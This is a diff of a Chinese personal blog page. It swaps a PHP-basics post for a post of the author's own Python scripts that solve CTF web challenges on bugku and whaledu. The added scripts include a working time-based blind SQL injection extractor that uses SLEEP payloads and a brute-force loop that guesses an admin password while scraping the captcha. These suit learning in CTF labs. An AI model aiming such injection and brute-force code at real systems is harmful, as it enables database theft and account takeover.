@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>php中一些比较实用的技巧 · my world</title>
+    <title>python自动化脚本学习笔记 · my world</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >黑桃⑨</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">php中一些比较实用的技巧</a>
+                <a href="#" class="post-name">python自动化脚本学习笔记</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            php中一些比较实用的技巧
+            python自动化脚本学习笔记
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "php学习">php学习</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "脚本">脚本</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,360</span> / Reading time: <span class="post-count">6 min</span></span>
+                        <span>Word count: <span class="post-count">919</span> / Reading time: <span class="post-count">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/15</span>
+                    <span class="post-intro-time">2018/10/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,161 +396,115 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>整理一些可能会用到的东西<br><a id="more"></a></p>
-<h1 id="两个变量互换位置"><a href="#两个变量互换位置" class="headerlink" title="两个变量互换位置"></a>两个变量互换位置</h1><h2 id="借助第三个变量"><a href="#借助第三个变量" class="headerlink" title="借助第三个变量"></a>借助第三个变量</h2><pre><code>$v1 = 10;
-$v2 = 20;
-$tmp = $v1;
-$v1 = $v2;
-$v2 = $vtmp;
-echo $v1,$v2;
-</code></pre><h2 id="利用加减法"><a href="#利用加减法" class="headerlink" title="利用加减法"></a>利用加减法</h2><pre><code>$v1 = 10;
-$v2 = 20;
-$v1 = $v1 + $v2;
-$v2 = $v1- $v2;
-$v1 = $v1 - $v2;
-echo $v1,$v2;
-</code></pre><h2 id="利用异或"><a href="#利用异或" class="headerlink" title="利用异或"></a>利用异或</h2><pre><code>$v1 = 10;             //$v1=01010
-$v2 = 20;            //$v2=10100
-$v1 = $v1 ^ $v2;    //$v1=11110
-$v2 = $v1 ^ $v2;    //$v2=01010
-$v1 = $v1 ^ $v2;    //$v1=10100
-</code></pre><p>用异或来获取两个数直接的不同点，在拥有不同点的情况下遇到任何一个数都推出另外一个数，本质上跟加减法类似</p>
-<h1 id="进制转换函数"><a href="#进制转换函数" class="headerlink" title="进制转换函数"></a>进制转换函数</h1><p>dec decimal 十进制 <br><br>bin binary 二进制  <br><br>oct octet 八进制 <br><br>hex hex 十六进制 <br><br>将两个进制的简写写在一起即为进制转换函数 <br><br>比如：decbin() 十进制转换为二进制 <br><br>dechex() 十进制转换为十六进制 <br></p>
-<h1 id="php中的输出语句"><a href="#php中的输出语句" class="headerlink" title="php中的输出语句"></a>php中的输出语句</h1><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>echo在输出时将输出的内容转换为字符串再输出，所以只能输出标量数据，在输出true和false时，会输出1和字符空。再输出数组时，会报错 </p>
-<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>和echo一样,区别在于print()是一个函数，会返回值，而echo是语法结构，不会返回值</p>
-<h2 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h2><p>可以输出标量以及复合数据类型，但是布尔值还是只会输出1或者字符空</p>
-<h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><p>可以输出值以及其类型</p>
-<h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h2><p>用于格式化输出 <br><br>语法： <br><br>    sprintf(格式化字符串，变量1，变量2，…..) <br><br>格式化占位符： <br><br>%b    二进制 <br><br>%d    十进制 <br><br>%o    八进制 <br><br>%f    浮点 <br><br>%x    十六进制 <br></p>
-<pre><code>&lt;?php
-    $v1 = 255;
-echo sprintf(&apos;二进制为:%b&lt;br /&gt;十进制为:%d&lt;br /&gt;八进制为:%o&lt;br /&gt;十六进制为:%x&apos;,$v1,$v1,$v1,$v1);
-</code></pre><p>结果：</p>
-<pre><code>二进制为：11111111
-十进制为：255
-八进制为：377
-十六进制为：ff
-</code></pre><p>%f用于输出浮点数，默认显示小数后6位，可以指定显示几位小数，比如指定显示两位：%.2f</p>
-<h1 id="PHP标签语法"><a href="#PHP标签语法" class="headerlink" title="PHP标签语法"></a>PHP标签语法</h1><p>当在HTML插入PHP代码的时候使用PHP标签语法 <br></p>
-<pre><code>&lt;?php for($i=1;$i&lt;=4;$i++){?&gt;
-    &lt;span&gt;&lt;?php echo $i?&gt;&lt;/span&gt;
-&lt;?php }?&gt; // 结尾 } 前面必须要加空格，不然会报错
+        <p>为什么要用脚本，愉快的手工注入不好吗？<br><a id="more"></a></p>
+<h1 id="自己写的一些脚本"><a href="#自己写的一些脚本" class="headerlink" title="自己写的一些脚本"></a>自己写的一些脚本</h1><h2 id="bugku-成绩单"><a href="#bugku-成绩单" class="headerlink" title="bugku-成绩单"></a>bugku-成绩单</h2><pre><code># -*- coding: UTF-8 -*-
+import requests
+import time
 
-// if标签语法
-// 标准语法
-&lt;?php if(...):?&gt;
-  // 语句体
-&lt;?php endif ?&gt;
+url = &quot;http://123.206.87.240:8002/chengjidan/&quot;
+flag=&apos;&apos;
+k=&quot;abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    匹配用的字符串
+# 先手工测试长度
+# 1&apos; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4 #        测试表长
+# 1&apos; and length((select group_concat(column_name) from information_schema.columns where table_name=&apos;fl4g&apos;))=10 #    测试列长
+# 1&apos; and length((select skctf_flag from fl4g))=31 #        测试flag长
+for x in range(1,32):    #这里的range范围为上一步测试的长度+1
+    for s in k:            #遍历取出字符
+        startTime=time.time()        #获取响应时间（大概）
+        #payload = &quot;1&apos; AND IF(SUBSTRING(DATABASE(), &quot;+ str(x) +&quot;, 1) = &apos;&quot;+ s +&quot;&apos;, SLEEP(5), 1)#&quot;    #猜解数据库
+        #payload = &quot;1&apos; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;+ str(x) +&quot;,1)=&apos;&quot;+ s +&quot;&apos;,sleep(5),1)#&quot;    #猜解表名
+        #payload = &quot;1&apos; and if(substr((select column_name from information_schema.columns where table_name=&apos;fl4g&apos; limit 0,1),&quot;+ str(x) +&quot;,1)=&apos;&quot;+ s +&quot;&apos;,sleep(5),1)#&quot;    #猜解列名
+        payload = &quot;1&apos; and if(substr((select skctf_flag from fl4g),&quot;+ str(x) +&quot;,1)=&apos;&quot;+ s +&quot;&apos;,sleep(5),1)#&quot;    #爆flag
 
-// 简化语法
-&lt;?php if(...){&gt;
-  // 语句体
-&lt;?php }?&gt;
+        r = requests.post(url,data={&apos;id&apos;:payload})    #发送请求
+        if time.time() - startTime &gt; 4:            #判断延时是否为5秒
+            flag+=s                            #是的话拼接字符串，然后退出循环
+            print &quot;flag is ：&quot;+flag            #打印字符串
+            break
+r.encoding = &apos;UTF-8&apos;                #运行之后的结果以utf-8编码显示（有些题目可能不需要用到这个）
+print &apos;flag is :&apos; + flag            #打印出最终的字符串
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre><p>运行结果： <br><br><img src="https://i.imgur.com/s8GBAvs.png" alt="图1"> <br><br>不知道为什么第一个字符会是乱码，不过好在最后的结果没有问题</p>
+<h2 id="bugku-秋名山老司机"><a href="#bugku-秋名山老司机" class="headerlink" title="bugku-秋名山老司机"></a>bugku-秋名山老司机</h2><pre><code># -*- coding: UTF-8 -*-
+import requests
+import re
 
-//for标签语法
-// 标准语法
-&lt;?php for(...):?&gt;
-  // 循环体
-&lt;?php endif ?&gt;
+url = &quot;http://123.206.87.240:8002/qiumingshan/&quot;
+s = requests.Session()
+r = s.get(url)
+k = re.search(&apos;(?&lt;=&lt;div&gt;)(.*)(?==)&apos;,r.text).group(0)    #正则表达式匹配字符串，使用零宽断言来匹配式子
+v = eval(k)
+r = s.post(url, data={&apos;value&apos;:v}) 
+r.encoding = &apos;UTF-8&apos;
+print(r.text)
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre><p>运行结果: <br><br><img src="https://i.imgur.com/TNyBn4q.png" alt="2"> <br><br>关键在于正则表达式的书写</p>
+<h2 id="bugku-速度要快"><a href="#bugku-速度要快" class="headerlink" title="bugku-速度要快"></a>bugku-速度要快</h2><pre><code># -*- coding: UTF-8 -*-
+import requests
+import base64
+import re
 
-&lt;?php for(...){?&gt;
-  // 循环体
-&lt;?php }?&gt;
-</code></pre><h1 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h1><h2 id="日期和时间函数"><a href="#日期和时间函数" class="headerlink" title="日期和时间函数"></a>日期和时间函数</h2><p>time() <br><br>    用于获取当前时间的时间戳，单位是秒。时间戳是从时间原点至现在的一个秒数。 <br><br>    时间原点：计算机中规定从1970年1月1日0时0分0秒那一刻作为时间原点 <br><br>microtime() <br><br>    用于计算毫秒，毫秒永远小于1 <br><br>date(format [,time]) <br><br>    用于格式化时间信息 <br><br>    format用于格式化时间的字符串，time表示需要格式化的时间戳 <br><br>mktime(时，分，秒，月，日，年) <br><br>    用于获取一个指定的时间戳  <br><br>strtotime(string) <br><br>    讲一个以字符形式描述的时间转换为时间戳，可以快速运算出例如密码更换策略等</p>
-<h1 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h1><h2 id="while-each-list遍历"><a href="#while-each-list遍历" class="headerlink" title="while-each-list遍历"></a>while-each-list遍历</h2><p>使用while、each、list语法结构来遍历数组 <br></p>
-<h3 id="each"><a href="#each" class="headerlink" title="each"></a>each</h3><p>each(数组) <br><br>    用于获取当前指针所指的键名与键值</p>
-<pre><code>$arr = [&apos;key&apos;=&gt;&apos;value&apos;];
-print_r(each($arr));
-Array
-(
-    [1] =&gt; value
-    [value] =&gt; value
-    [0] =&gt; key
-    [key] =&gt; key
-)
-</code></pre><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>list(); <br><br>将数组中的索引元素赋值给变量列表中的变量。 <br></p>
-<pre><code>$arr = [10,20,30,40];
-list($a, $b, $c, $d) = $arr;
-</code></pre><p>用each+list遍历数组：</p>
-<pre><code>$arr = array(&apos;one&apos;=&gt;&apos;1&apos;, &apos;two&apos;=&gt;&apos;2&apos;, &apos;three&apos;=&gt;&apos;3&apos;);
-while(list($k,$v) = each($arr)){
-  echo $k.&apos;=&gt;&apos;.$v,&apos;&lt;br/&gt;&apos;;
-}
-</code></pre><p>先将each($arr)的值赋给list($k,$v)，然后拿list($k,$v)作为表达式，即$k,当遍历有值的时候，$k=true,当遍历到最后的null的时候$k=flase</p>
-<h2 id="foreach-list遍历"><a href="#foreach-list遍历" class="headerlink" title="foreach-list遍历"></a>foreach-list遍历</h2><pre><code>// php&gt;5.6
-// 注意：list只能使用索引数组
-$arr = [
-  [1,2,3,4]
-];
+url = &quot;http://123.206.87.240:8002/web6/&quot;
+s = requests.Session()            #保持访问时的session
+r = s.get(url).headers[&quot;flag&quot;]    #flag在消息头中，这样可以获取消息头中的flag参数
+r = str(base64.b64decode(r))    #将获取到字符串base64解码
+&apos;&apos;&apos;
+k = re.search(&apos;(?&lt;=:)(.*)&apos;,r).group(0)    #正则匹配，匹配等号后面的flag
+r = base64.b64decode(k)                    #再将匹配的结果base64编码
+&apos;&apos;&apos;
+r = base64.b64decode(r.split(&quot;: &quot;)[1])    #获取等号后面的flag
+r = s.post(url,data={&apos;margin&apos;:r})         #通过post传值
+print(r.text)
 
-foreach($arr as list($a, $b, $c, $d)){
-  echo $a,$b,$c,$d;
-}
-</code></pre><h1 id="数组算法"><a href="#数组算法" class="headerlink" title="数组算法"></a>数组算法</h1><h2 id="排序法"><a href="#排序法" class="headerlink" title="排序法"></a>排序法</h2><h3 id="冒泡排序法"><a href="#冒泡排序法" class="headerlink" title="冒泡排序法"></a>冒泡排序法</h3><p>注意内循环的条件与外循环的条件 <br><br>外循环中，由于是交换两个数，只需要循环数组数-1即可 <br><br>内循环中，由于每一个循环都会把最大值放到最右边，所以最右边的界限需要不断改变 <br></p>
-<pre><code>$arr = [10,5,100,255,64,1];
-$len = count($arr);
-for($i=1;$i&lt;$len ;$i++){
-    for($j=0;$j&lt;$len-$i;$j++){
-        if($arr[$j]&gt;$arr[$j+1]){
-            $temp = $arr[$j];
-            $arr[$j] = $arr[$j+1];
-            $arr[$j+1] = $temp;
-        }
-    }
-}
-foreach($arr as $value){
-    echo &apos;[&apos;.$value.&apos;],&apos;;
-}
-</code></pre><h3 id="插入排序法"><a href="#插入排序法" class="headerlink" title="插入排序法"></a>插入排序法</h3><p>1、从第一个元素开始，第一个元素已经被排列 <br><br>2、在取下一个元素，将其和已经排序的元素中从后往前比较 <br><br>3、如果以排列元素大于新元素，那么交换两者位置 <br><br>4、重复步骤3，直到以排序元素小于或者等于新元素 <br><br>5、重复2-4步骤 <br></p>
-<pre><code>$arr = [10,5,100,255,64,1];
-for($i=1;$i&lt;count($arr);$i++){
-    $tmp = $arr[$i];
-    for($j=$i-1;$j&gt;=0;$j--){
-        if($arr[$j]&gt;$arr[$j+1]){
-            $arr[$j+1] = $arr[$j];
-            $arr[$j] = $tmp;
-        }
-    }
-}    
-print_r($arr);
-</code></pre><h2 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h2><h3 id="顺序查找法"><a href="#顺序查找法" class="headerlink" title="顺序查找法"></a>顺序查找法</h3><pre><code>unction searchArr($arr, $search){
-    for($i=0;$i&lt;=count($arr);$i++){
-        if($arr[$i]==$search){
-            echo $search;
-            break;
-        }
-    }
-}
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre><p>运行结果： <br><br><img src="https://i.imgur.com/2rHccOt.png" alt="3"></p>
+<h2 id="蓝鲸ctf-不明觉厉"><a href="#蓝鲸ctf-不明觉厉" class="headerlink" title="蓝鲸ctf-不明觉厉"></a>蓝鲸ctf-不明觉厉</h2><pre><code># -*- coding: UTF-8 -*-
+import requests
+import re
+import sys 
+reload(sys) 
+sys.setdefaultencoding(&apos;utf-8&apos;)
+#encoding = &apos;UTF-8&apos;
 
-$arr = [10,5,100,255,64,1];
-searchArr($arr, &apos;64&apos;);
-</code></pre><h3 id="二分查找法"><a href="#二分查找法" class="headerlink" title="二分查找法"></a>二分查找法</h3><p>前提为数组有序并不重复 <br><br>可以简单的把数组想象成一个轴，对轴进行二分 <br></p>
-<pre><code>$arr = [1,2,3,4,5,6,12,15,17,18,32,55,73,74,89];
+url = &quot;http://ctf.whaledu.com:10010/web38/9s81jWjd98YU.php&quot;
 
+for x in range(11111,12111):    #选定密码的范围
+    s = requests.Session()        #每次请求时获取session值
+    r = s.get(url)                #由获取到的session值来请求页面
+    k = re.search(&apos;\d{3}&apos;,r.text).group(0)        #正则匹配，匹配三个连续的数字，返回第一条匹配结果
+    r = s.get(url+&apos;?username=admin&amp;password=&apos;+ str(x) +&apos;&amp;randcode=&apos;+k)        #构造访问语句
+    r.encoding = &apos;UTF-8&apos;
+    &apos;&apos;&apos;                        #由请求返回的长度来判断，错误请求页面的长度都是一样的，当长度不一样时，返回的就是正确的页面
+    if len(r.content)!=163:        
+        print(&apos;密码是&apos; + str(x) + &apos;\n&apos;)
+        print(r.content)
+        break
 
-function searchArr($arr, $search){
-    $left = 0;
-    $right = count($arr);
-    while($left &lt;= $right){
-        $mid = ceil(($left + $right) / 2);
-        if($search &gt; $arr[$mid]){
-            $left = $mid + 1;
-        }elseif($search &lt; $arr[$mid]){
-            $right = $mid - 1;
-        }else{
-            return &apos;yes&apos;;
-        }
-    }
-    return &apos;no,not exists&apos;;
-}
-echo searchArr($arr, 15);
-</code></pre>
+    &apos;&apos;&apos;
+    &apos;&apos;&apos;                        #由访回的页面中是否有密码错误来判断
+    if &apos;密码错误&apos; not in r.text:
+        print(&apos;密码是&apos; + str(x) + &apos;\n&apos;)
+        print(r.content)
+        break
+    &apos;&apos;&apos;
+
+    if &apos;密码错误&apos; in r.text:                #同样是由返回的页面中是否有密码错误来判断，区别是会回显脚本运行过程
+        print(&apos;密码&apos;+ str(x) +&apos;错误&apos;)
+    else:
+        print(&apos;密码是&apos; + str(x) + &apos;\n&apos;)
+        print(r.content)
+        break
+
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre><p>运行结果： <br><br><img src="https://i.imgur.com/Dw0kT2U.png" alt="图4"> <br><br>直接运行会出现乱码， 所以也只能在编译器里运行了</p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://perfect.xyz">黑桃⑨</a>
-            <p>原文链接: <a href="https://perfect.xyz/2018/07/15/phpstudy-2/">https://perfect.xyz/2018/07/15/phpstudy-2/</a>
-            <p>发表日期: <a href="https://perfect.xyz/2018/07/15/phpstudy-2/">July 15th 2018, 3:00:05 pm</a>
+            <p>原文链接: <a href="https://perfect.xyz/2018/10/17/python-auto-script/">https://perfect.xyz/2018/10/17/python-auto-script/</a>
+            <p>发表日期: <a href="https://perfect.xyz/2018/10/17/python-auto-script/">October 17th 2018, 3:11:17 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -559,16 +513,16 @@ echo searchArr($arr, 15);
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/19/sqli-labs/" title= sqli-libs解题思路-Basic Challenges >
-                    <div class="nextTitle">sqli-libs解题思路-Basic Challenges</div>
+                <a href= "/2018/10/24/shiyan8/" title= 实验吧-web-wp >
+                    <div class="nextTitle">实验吧-web-wp</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/13/phpstudy-1/" title= php学习笔记-基础部分 >
-                    <div class="prevTitle">php学习笔记-基础部分</div>
+                <a href= "/2018/10/10/CGCTF-wp/" title= cgctf-web-wp >
+                    <div class="prevTitle">cgctf-web-wp</div>
                 </a>
             
         </li>
@@ -584,7 +538,7 @@ echo searchArr($arr, 15);
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        // id: "php中一些比较实用的技巧", // 可选。默认为 location.href
+        // id: "python自动化脚本学习笔记", // 可选。默认为 location.href
         owner: 'a1055883471',
         repo: 'a1055883471.github.io',
         oauth: {
@@ -697,7 +651,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#两个变量互换位置"><span class="toc-number">1.</span> <span class="toc-text">两个变量互换位置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#借助第三个变量"><span class="toc-number">1.1.</span> <span class="toc-text">借助第三个变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用加减法"><span class="toc-number">1.2.</span> <span class="toc-text">利用加减法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用异或"><span class="toc-number">1.3.</span> <span class="toc-text">利用异或</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#进制转换函数"><span class="toc-number">2.</span> <span class="toc-text">进制转换函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php中的输出语句"><span class="toc-number">3.</span> <span class="toc-text">php中的输出语句</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#echo"><span class="toc-number">3.1.</span> <span class="toc-text">echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#print"><span class="toc-number">3.2.</span> <span class="toc-text">print()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#print-r"><span class="toc-number">3.3.</span> <span class="toc-text">print_r()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#var-dump"><span class="toc-number">3.4.</span> <span class="toc-text">var_dump()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sprintf"><span class="toc-number">3.5.</span> <span class="toc-text">sprintf()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP标签语法"><span class="toc-number">4.</span> <span class="toc-text">PHP标签语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#系统函数"><span class="toc-number">5.</span> <span class="toc-text">系统函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#日期和时间函数"><span class="toc-number">5.1.</span> <span class="toc-text">日期和时间函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#遍历数组"><span class="toc-number">6.</span> <span class="toc-text">遍历数组</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#while-each-list遍历"><span class="toc-number">6.1.</span> <span class="toc-text">while-each-list遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#each"><span class="toc-number">6.1.1.</span> <span class="toc-text">each</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#list"><span class="toc-number">6.1.2.</span> <span class="toc-text">list</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#foreach-list遍历"><span class="toc-number">6.2.</span> <span class="toc-text">foreach-list遍历</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#数组算法"><span class="toc-number">7.</span> <span class="toc-text">数组算法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#排序法"><span class="toc-number">7.1.</span> <span class="toc-text">排序法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#冒泡排序法"><span class="toc-number">7.1.1.</span> <span class="toc-text">冒泡排序法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#插入排序法"><span class="toc-number">7.1.2.</span> <span class="toc-text">插入排序法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查找算法"><span class="toc-number">7.2.</span> <span class="toc-text">查找算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#顺序查找法"><span class="toc-number">7.2.1.</span> <span class="toc-text">顺序查找法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二分查找法"><span class="toc-number">7.2.2.</span> <span class="toc-text">二分查找法</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#自己写的一些脚本"><span class="toc-number">1.</span> <span class="toc-text">自己写的一些脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bugku-成绩单"><span class="toc-number">1.1.</span> <span class="toc-text">bugku-成绩单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bugku-秋名山老司机"><span class="toc-number">1.2.</span> <span class="toc-text">bugku-秋名山老司机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bugku-速度要快"><span class="toc-number">1.3.</span> <span class="toc-text">bugku-速度要快</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#蓝鲸ctf-不明觉厉"><span class="toc-number">1.4.</span> <span class="toc-text">蓝鲸ctf-不明觉厉</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
